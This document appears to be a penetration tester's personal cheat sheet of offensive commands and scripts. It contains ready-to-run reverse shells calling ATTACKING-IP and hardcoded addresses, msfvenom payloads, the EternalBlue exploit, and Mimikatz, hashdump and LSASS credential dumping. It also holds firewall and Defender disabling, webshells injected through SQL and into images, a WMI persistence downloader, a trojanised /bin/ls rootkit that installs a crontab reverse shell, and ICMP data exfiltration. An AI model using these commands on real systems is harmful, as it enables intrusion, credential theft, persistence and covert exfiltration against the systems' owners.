# pentestnotes
**************************************** EternalBlue 32bit ***************************************************************

	wget https://raw.githubusercontent.com/worawit/MS17-010/20301cc5a96fa367d46d88291637247cc6252488/zzz_exploit.py

	wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py 

Enum msrpc for eternal blue

	nmap 10.10.70.129 --script=msrpc-enum
	nmap 10.10.70.129 --script=smb-vuln-ms17-010

Metasploit enum eternal blue

	use auxiliary/scanner/smb/smb_ms17_010
	
**************************************************************************************************************************
#PowerSploit Invoke-Mimikatz

	set-executionpolicy unrestricted -scope currentuser
	(iwr -uri http://[invoke-mimikatzURL]).content > C:\windows\temp\a.psm1
 	import-module .\a.psm1 #need abs path
 
*********************************************** Metasploit tips ********************************************************

Migrate to a proc that hopefully won't die

	run post/windows/manage/migrate

Kill firewall(needs system/admin lvl perms)
	
	killfw 

	run post/windows/manage/killfw

#check if you're in a vm

	run post/windows/gather/checkvm

Set autorun scripts after exploitation

	msf5> set AutoRunScript multi_console_command -rc /root/autoruncommands.rc

Shellcode for reverse shell

	msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=%s LPORT=%d -f raw

Exe reverse shell

	msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=%s LPORT=%d -f exe
	#Process exits so need to remove the call to exitprocess
*************************************** ENCODING FILE *********************************************************************

List Encoders 

	msfvenom --list encoders

Encode a file

	msfvenom -p generic/custtom PAYLOADFILE=[filepath] -a x86 --platform Windows -e x86/add_sub -f raw -o outfile.bin

READ FROM STDIN
	
	cat [binary_file] | msfvenom -b [bad_chars] -e [encryption] -f [format] -a x86 --platform windows -p -
**************************************************************************************************************************
MSHTA payload MSHTA payloads van be swapped with any VBA payloads since that's all they are

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.2 PORT=4444 -f hta-psh

List payloads

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.2 PORT=4444 -f --list

Linux reverse shell

	msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.0.48 LPORT=4444 -b "\x00" -f elf -o <file>
	
********************************************** PHP WEBSHELLS **************************************************************

Generate PHP meterpreter r shell. Here the / instead of the _ means it's staged
 
	msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw > rphpshell.php

Generate PHP meterpreter r shell. Here the _ instead of the / means it's unstaged

	msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=4444 -f raw > rphpshell.php

PHP
use php eval() to evaluate php code (i.e. php reverseshell)
use system()/ shell_exec() / exec() to run system shell commands (not passed to php interpreter)

PHP reverse handler

	use multi/handler
	set PAYLOAD php/meterpreter_reverse_tcp

Exploit suggester

	#From meterpreter shell
	run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true
	#background shell
	bg
	#select local priv escalation
	use exploit/windows/local/ms13_053_schlamperei
	#set the reverse shell options (requires a second r shell. kill initial one after success)

	#point to current meterpreter session

	set SESSION [sessionid]
	set LHOST [attackerIP]
	set LPORT [attackerPort]
	exploit -j #once this reverse shell is caught, kill first one (sessions -k <id>)

Mimikatz - in meterpreter session run

	load mimikatz #loads mimikatz module
	kerberos  #dumps cleartext creds

Check privs

	run post/windows/gather/win_privs

Port forward

	meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.191
	
*********************************************** Scheduled Tasks *************************************************************

Schedule task every 5 mins

	SCHTASKS /create /sc minute /mo 5 /tn "Print Admin" /tr "\"c:\windows\system32\cscript.exe\" //nologo c:\Windows\System32\Printing_Admin_Scripts\en-US\prndrvs.vbs" /RU "SYSTEM" /f
schtasks /query /TN "Print Admin" /v

Schedule remote task. need to specify a user. make sure dest file exists

	SCHTASKS /create /sc minute /mo 1 /tn "Print Admin" /tr "\"c:\windows\system32\cscript.exe\" //nologo c:\Windows\System32\Printing_Admin_Scripts\en-US\prndrvs.vbs" /s mfdompc1 /u npickle /f

**************************************************************************************************************************
Copy ps to temp as svc

	$a="$((cmd /c 'path') -split ';'|unique|?{test-path "$_\powershell.exe" })powershell.exe";cp $a "$($env:temp)\svc.exe"

**************************************************************************************************************************
#Powershell meterpreter reverse

	msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=10.10.70.132 LPORT=8888 -f powershell
#output example

$a = '0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x68,0xa,0xa,0x46,0x84,0x68,0x2,0x0,0x22,0xb8,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x67,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xf,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5'

Inject with Invoke-Shellcode
	
	C:\PS> Invoke-Shellcode -ProcessId 4274 -Shellcode $a 

Compress meterpreter reverseshell
	
	function e($p){$p=($p.split(',')|%{$_ -replace '0x',''}) -join '';$p}

**************************************** Lateral scanning *****************************************************

Metasploit

	run arp_scanner -r 10.0.0.1/24
	or from shell arp -a
	add a route to pivot off exploited box
	bg #background session

	route add 1.1.1.0 255.255.255.0 [meterpretersessionID]

	#then scan for smb

	use auxiliary/scanner/smb/smb_version
	set RHOSTS 1.1.1.0/24 #CIDR notation

	rpcinfo -p $TARGET
	nbtscan $TARGET

List shares

	smbclient -L //$TARGET -U ""

Null session

	rpcclient -U "" $TARGET
	smbclient -L //$TARGET
	enum4linux $TARGET
	
Active Directory

Current domain info

	[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

Domain trusts

	([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

Current forest info

	[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

Get forest trust relationships

	([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

Get DCs of a domain

	nltest /dclist:offense.local
	net group "domain controllers" /domain

Get DC for currently authenticated session

	nltest /dsgetdc:offense.local

Gt domain trusts from cmd shell

	nltest /domain_trusts

Get user info

	nltest /user:"spotless"

Get DC for currently authenticated session

	set l
	echo %logonserver%

Get domain name and DC the user authenticated to
	
	klist

Get all logon sessions. Includes NTLM authenticated sessions
	
	klist sessions

Kerberos tickets for the session
	
	klist

Cached krbtgt

	klist tgt
	
******************************* IP Tables Rules / Allow our team only ****************************************

	iptables -P FORWARD DROP # we aren't a router
	iptables -A INPUT -m state --state INVALID -j DROP
	iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
	iptables -A INPUT -i lo -j ACCEPT
	iptables -A INPUT -s 192.168.1.1 -j ACCEPT
	iptables -P INPUT DROP # Drop everything we don't accept

systemctl start postgresql

disable firewall

	netsh advfirewall show allprofiles

	netsh advfirewall set allprofile state off

 

disable windows defender

	control /name Microsoft.WindowsDefender

 

change ip address

	/etc/network/interface

enum users

	nmap -n --script=smb-enum-users.nse -p 139 192.168.0.1

netcat scan

	nc -v -n -z -w1 192.168.0.1 20-80

	echo "" | nc -v -n -w1 192.168.0.1 20-80

netcat bridgeports

	mknod /tmp/file p

	nc -l -p 4444 0</tmp/file | nc localhost 22 1>/tmp/file

		ssh server 4444 <use port 4444

Web server

	python -m SimpleHTTPServer 8000

windows prompt

	runas /u:fred cmd.exe

	net user fred /add

	net user fred *

	net localgroup administrators fred /add

	net localgroup administrators fred /del
 
windows resolve range of IPs

	for /L %i in (1,1,255) do @nslookup 10.10.10.%1 10.10.10.60 2>nul | find "Name" && echo 10.10.10.%i

add netcat service

	sc \\victim create myservice binpath="c:\nc.exe -l -p 2222 -e cmd.exe"
	sc \\victim query myservice
	sc \\victim start myservice
	sc \\victim delete myservice

	wmic process call create "c:\nc.exe -d -l -p 4444 -e cmd.exe" /node:victim /user:[admin] /password:[password]
	wmic process where name="nc.exe" delete

	New-Service -name myservice -BinaryPathName "cmd.exe /k c:\nc.exe -l -p 3333 -e cmd.exe" -StartupType manual
	Start-Service myservice
	sc.exe delete myservice

powershell

	ls -r c:\users *password*.txt | % {echo $_.fullname}
	ls -r c:\users *pass* | % {echo $_.fullname;gc $_.fullname}

	wget "url" -outfile c:\f.txt; gc c:\f.txt; del c:\f.txt


REVERSE SHELL

	bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
	
	rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
	
	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()
	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	
	KALI
		/usr/share/webshells/*
		
REVERSE SHELL HANDLER

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.254.132 LPORT=4444 -f war > shell.war
	use exploit/multi/handler
	set PAYLOAD java/jsp_shell_reverse_tcp
	set LHOST 192.168.10.1
	run

passwords

	cp /user/share/john[tab][tab]/run/password.lst /tmp/

pw-inspector

	cat /tmp/password.lst | pw-inspector -m 6 -n -u -l -c 2
	use exploit/windows/smb/psexec
	set payload windows/meterpreter/reverse_tcp
	set rhost victim
	set lhost mylocal
	set SMBUSer username
	set SMBPass password
	run
	getprivs
	run hashdump

	load kiwi
	creds_all

	cp -r /opt/john[tab][tab] /tmp/john
	cd /tmp/john
	make clean linux-x86-sse2
	cp sam.txt /tmp
	cd run
	./john /tmp/sam.txt

	cp /etc/passwd /tmp/john/run/passwd_copy
	cp /etc/shadow /tmp/john/run/shadow_copy

	./unshadow password_copy shadow_copy > combined.txt

	./john combined.txt

	cat john.pot

nikto

	nikto -h 192.168.254.133

 

blind command injection

	tcpdump -n host local and icmp
	>> test; ping -c 4 local; echo hello
	test; nc -n -v- -l -l 2222 -e /bin/bash; echo hello
	nc -n -v -l -p 2222
	test; /bin/bash -i > /dev/tcp/[local]/2222 0<&1 2>&1; echo hello

 

SQL injection

	" union select "<?php if (isset($_REQUEST['cmd'])){echo '<pre>; system($_REQUEST['cmd']); echo '</pre>'; } ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>","", "","","","" into outfile "/var/www/html/filename.php" #


	sqlmap -u <utL> --data="id=1&submit=submit" --cookie="<cookie value>" --dbs	
	sqlmap -u <utL> --data="id=1&submit=submit" --cookie="<cookie value>" --msf-path=/usr/share/metasploit-framework/ --os-pwn --tmp-path="C:\temp"	

nmap -sS -A -sV -p3306 192.168.0.0


MySQL 	5.1.x before 5.1.63, 
		5.5.x before 5.5.24, 
		5.6.x before 5.6.6
MariaDB 	5.1.x before 5.1.62, 
			5.2.x before 5.2.12, 
			5.3.x before 5.3.6,
			5.5.x before 5.5.23, 

	for i in `seq 1 1000`; do
	mysql -u root --password=bad -h 192.168.0.0
	done

MySQL versions before or equal to 5.1.61 (on some platforms)
MySQL versions before or equal to 5.5.24 (on some platforms)

	use auxiliary/scanner/mysql/mysql_authbypass_hashdump
	set RHOSTS 192.168.178.43
	set USERNAME root
	run

MYSQL brute force
	use auxiliary/scanner/mysql/mysql_login
	/usr/share/wordlists
	set THREADS 1000
	set RHOSTS 192.168.179.142
	set PASS_FILE /usr/share/wordlists/rockyou.txt
	set USERNAME root
	set STOP_ON_SUCCESS true
	set VERBOSE false
	set BLANK_PASSWORDS true
	run

MYSQL read file
	use auxiliary/admin/mysql/mysql_sql
	set USERNAME root
	set PASSWORD ”
	set RHOST 192.168.179.142
	set RPORT 3306
	set SQL select load_file(\’/etc/passwd\’)


MYSQL writable dirs
	use auxiliary/scanner/mysql/mysql_writable_dirs
	set rhosts 192.168.1.108
	set username root
	set password 123
	set dir_list /root/dir.txt
	exploit

MYSQL enumerate files
	use auxiliary/scanner/mysql/mysql_file_enum
	set rhosts 192.168.1.108
	set username root
	set password 123
	set file_list /root/dir.txt
	exploit

https://hack2rule.wordpress.com/2017/02/25/sql-injection-to-meterpreter/
https://www.hackingarticles.in/penetration-testing-on-mysql-port-3306/
https://www.yeahhub.com/mysql-pentesting-metasploit-framework/

               
POP3

	nmap -sV --script=pop3-brute <target>

 
DOWNLOAD
	bitsadmin /transfer myDownloadJob /download /priority normal URL FULLPATH
	certutil.exe -urlcache -split -f "URL" FILENAME

NETCAT
	nc -nvlp PORT
	nc -e  /bin/sh LOCAL PORT

SHELL
	Meterpreter> run post/windows/gather/hashdump

	reg save hklm\sam sam
	reg save hklm\system system
	$ samdump2 system sam


SAMBA execute
	use exploit/windows/smb/psexec
	set payload windows/meterpreter/reverse_tcp
	set SHARE C$
	set SMBUSER vagrant
	set SMBPASS aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

METASPLOIT modules

	RUBY on Rails
		use auxiliary/scanner/http/rails_xml_yaml_scanner
		set RHOSTS 192.168.0.0/24
		set RPORT 80
		set THREADS 128
		run
		
		use exploit/multi/http/rails_xml_yaml_code_exec
		set RHOST 192.168.0.4
		set RPORT 80
		run

	pfSense  version <= 2.3.1_1
		use exploit/unix/http/pfsense_group_member_exec
		
	pfSense   version <= 2.2.6 
		use exploit/unix/http/pfsense_graph_injection_exec
		
	SAMBA
		use auxiliary/scanner/smb/smb_version
		use exploit/multi/samba/usermap_script
		
	VSFTPD
		use exploit/unix/ftp/vsftpd_234_backdoor
		
	VNC
		use auxiliary/scanner/vnc/vnc_none_auth
		set RHOSTS 192.168.1.0/24
		
		
SSH
	mkdir /etc/ssh/default_keys
	mv /etc/ssh/ssh_host_* /etc/ssh/default_keys/
	dpkg-reconfigure openssh-server
	systemctl start ssh.socket
	useradd cdx
	passwd cdx
	ssh -L 1234:localhost:5432 cdx@192.168.254.132
	cat /usr/share/metasploit-framework/config/database.yml
	db_connect msf:password@127.0.0.1:1234/msf
	
 ************************************* WMI persist ***********************************************
 
 #automated function to generate a powershell payload string that can be invoked as wmi persistence. 
 
 #need to obfuscate string
 
    function set-wmipersistence{
        [CmdLetBinding()]
        param(
        [parameter()]
        [string]$filterName='a1',
        [parameter()]
        [string]$consumerName='b1',
        [parameter()]
        [string]$exePath='C:\windows\system32\cmd.exe',
        [parameter()]
        [string]$cmdline,
        [parameter()]
        [string]$procName='LogonUI.exe'
        )

    $a = @("`$Query = `'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=`"$procName`"`'")
    $a += "`$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace `"root\subscription`" -Arguments @{Name=`'$filterName`';EventNameSpace=`"root\cimv2`";QueryLanguage=`"WQL`";Query=`'$Query`'} -ErrorAction Stop"
    $a += "`$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace `"root\subscription`" -Arguments @{Name=`'$consumerName`';ExecutablePath=`'$exePath`';CommandLineTemplate=`'$cmdline`'}"
    $a += "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace `"root\subscription`" -Arguments @{Filter=`$WMIEventFilter;Consumer=`$WMIEventConsumer}"

    $b = $a -join "; "
    echo $b
    #gwmi -Class __EventFilter -NameSpace "root\subscription" | ? {$_.__RELPATH -like "*$filterName*" } | Remove-WmiObject
    #gwmi -Class __FilterToConsumerBinding -Namespace "root\subscription" | ? { $_.consumer -like $consumerName } | Remove-WmiObject
    #Get-WmiObject -Namespace root\subscription -Class __EventConsumer | ? {$_.__RELPATH -like "*bot*" } | Remove-WmiObject

    }

    $payload = 
    @' 
    while(1){
    
        $z='c:\Windows\System32\Printing_Admin_Scripts\en-US\prndrvs.vbs'
        $d='HKCU:\Software\PrintAdmin'
        $h = @('10.10.70.131', '10.10.70.132')
        
        if(!(Test-Path $z)){ 
            echo 'vbs not found'
             
            echo 'file created'; 
            echo 'checking reg'
            $s = (Get-ItemProperty $d -EA Silen ).win32Admin }
        if($s){ echo 'key exists'
            #New-Item -Path $z -Force -Type file -EA Sil >$null
            [Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s)) > $z }
    
        else{
            echo 'enter loop'
            mkdir $d -EA SilentlyContinue
            foreach($i in $h){
                echo "trying $i"
                try{$j=(New-Object System.Net.WebClient).DownloadString("http://$i/test.png"); echo 'got contents'}
                catch{ $j = $null; echo 'shit' }
    
                if($j){
                    
                    $j>$z
                    $v= [IO.File]::ReadAllBytes($z)
                    sp -Path $d -Name win32Admin -Value $([System.Convert]::ToBase64String($v)) >$null
                    }
                }
            } 
        echo "going ni' ni'"       
        sleep 3 #$(random -Minimum 750 -Maximum 900)
        }
    '@
    #USE UNICODE DAMNIT
    function strToB64($string){
        $([System.Convert]::ToBase64String([Text.Encoding]::Unicode.getbytes($payload)))
        }
    
    
    function DumpPayload($payload){ 
    $ret =  "cmd /c 'powershelL.exe -EncodedCommand $(strToB64($payload))`'" 
    echo $ret
    
    }
    
************************************* User-Mode rootkit through Crontab / ls *****************
	
	mv /bin/ls /bin/sl
	echo "crontab -l | { cat; echo \"* * * * * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.70.132\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"; } | crontab -" > /bin/ls
	echo 'sl $1 $2 $3 $4 $5' >> /bin/ls
	chmod +x /bin/ls

************************************* Obfuscate binaries ************************************
Obfuscate binary hash

	echo zzz >> psexec.exe
	
************************************* Exfil ***********************************************

ICMP split file ping payload
	
	for i in `hexdump exp -v -e '16/1 "%02x" "\n"'`; do ping -p $i 10.10.70.132 -c 1; done; ping -p $(printf '%032d' $(wc -c<exp)) -c 1 10.10.70.132
	
Get ICMP Payload (forgot to account for file length). Scapy would be easier to do, but if scapy isn't available 

	#!/usr/bin/env python
	#wrote by pic =)
	import sys, re, subprocess as subp

	fileName = sys.argv[1]
	p = subp.Popen(['tcpdump -r {} -x'.format(fileName)],shell=True, stdout=subp.PIPE)
	buff,perror = p.communicate()
	f = re.findall(r"^[\s\S].*?(?=\n[\S])", buff, re.MULTILINE|re.DOTALL)
	uniques = []
	dupes = []
	for i in f:
		packetId = re.findall(r'id\s\d+',i)
		if re.findall(r'id\s\d+',i) not in dupes:
			dupes.append(packetId)
			uniques.append(i)
	for i in uniques:
		j = re.findall(r"(?<=0x00[2|3]0:\s\s)(.*?)\n", i, re.DOTALL)
		j1 = (j[0]).split(' ')
		j2 = (j[1]).split(' ')
		payload1, payload2 = (''.join(j1[-2:])),(''.join(j2[0:6]))
		print payload1 + payload2


************************************* PHP Inject into Image ***********************************************
	
	exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
	exiftool “-comment<=back.php” back.png
	echo <reverseshell_phpcode> >> picture.pnp 

************************************* Proc Dump *************************************

Rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of lsass.exe] dump.bin full
